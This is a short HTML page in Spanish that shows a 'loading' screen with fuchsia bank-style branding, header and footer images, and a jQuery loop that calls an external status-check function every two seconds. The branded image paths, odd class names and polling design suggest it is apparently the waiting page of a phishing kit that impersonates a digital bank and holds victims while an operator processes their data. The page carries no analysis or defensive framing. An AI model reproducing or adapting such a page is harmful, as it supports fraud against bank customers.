<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando propulsor</title>
    <!-- Incluye Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

    <script type="text/javascript" src="/js/jquery-3.6.0.min.js"></script>
		<script src="/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/js/functions.js"></script>  
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <style>
        .cabezeramor-t3 {
            background-color: #ffffff; 
            height: 80px;
            width: 100%;
            position: fixed;
            top: 0;
            z-index: 1000; 
        }
        .cabezeramor-t3 .container {
            display: flex;
            justify-content: space-between;
            align-items: center; 
            padding: 20px;
        }

        .cabezeramor-t3 img {
            margin: 0 10px;
        }

        .fondo-pantalla {
    background-image: url("img/fondo.png"); 
    background-color: #fbe5f2;
    background-size: cover; 
    background-repeat: no-repeat; 
    background-position: center; 
    height: 100vh; 
    padding-top: 120px; 


    
}
        .tarjeta {
            width: 90%;
            border: 2px solid rgb(255, 255, 255);
            max-width: 390px;
            margin: 0 auto; 
        }

        .form-control {
            background-color: #FBF7FB;
            height: 48px;
            width: 100%; 
            border: none; 
            box-shadow: none;
            outline: none; 
            border-radius: 4px; 
        }



    .form-floating>.form-control-plaintext~label, .form-floating>.form-control:focus~label, .form-floating>.form-control:not(:placeholder-shown)~label, .form-floating>.form-select~label~label::after {
    color: #FF00FF;
}

.form-floating > .form-control-plaintext ~ label::after,
.form-floating > .form-control:focus ~ label::after,
.form-floating > .form-control:not(:placeholder-shown) ~ label::after,
.form-floating > .form-select ~ label::after {
    position: absolute;
    inset: 1rem 0.375rem;
    z-index: -1;
    height: 1.5em;
    content: "";
    border-radius: var(--bs-border-radius);
    background-color: #FBF7FB;
}


.form-control:focus + label {
    color: #FF00FF;
}


        .form-control:not(:placeholder-shown) + label {
            color: #DA0081; 
        }

        .form-control:focus {
            outline: none; 
        }

        .form-control:focus {
    background-color: #FBF7FB; 
    outline: none; 
}

.btn-fuchsia {
    height: 48px;
    background-color: #FF00FF; 
    color: #fff; 
    border: none;
    border-radius: 4px;
}

.btn-fuchsia:disabled {
    background-color: #F1BFDA; 
}

.caccalote {
    display: flex;
    justify-content: center;
    align-items: center; 
    height: calc(100vh - 80px);
    padding-top: 80px; 
    text-align: center; 
}

.amamamia {
    width: 120px; 
    height: auto;
}


    </style>
</head>

<body>
    <header class="cabezeramor-t3">
        <div class="container d-flex justify-content-between">
            <div>
                <img src="/bdigital/images/logo.svg" alt="Logo" height="40">
            </div>
            <div>
                <img src="/bdigital/images/3ra.jpg" alt="Icono" height="30">
            </div>
        </div>
    </header>
    <div class="caccalote">
        <img src="/bdigital/images/gnequi.gif" alt="Cargando.." class="amamamia">
    </div>
    
    <footer class="footer-mobile d-md-none" style="margin-top: 150px;" >
    <div class="footer-content">
        <img src="/bdigital/images/footer.jpeg" alt="Footer" class="footer-image">
    </div>
</footer>

<style>
.footer-mobile {
    width: 100%; 
    text-align: center; 
}
.footer-image {
    width: 100%; 
    max-width: 500px;
}
</style>
    
    <script language="javascript">
$(document).ready(function() {
	setInterval(consultar_estado,2000);	
    console.log("Cargando")
});
</script>

    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>

</html>





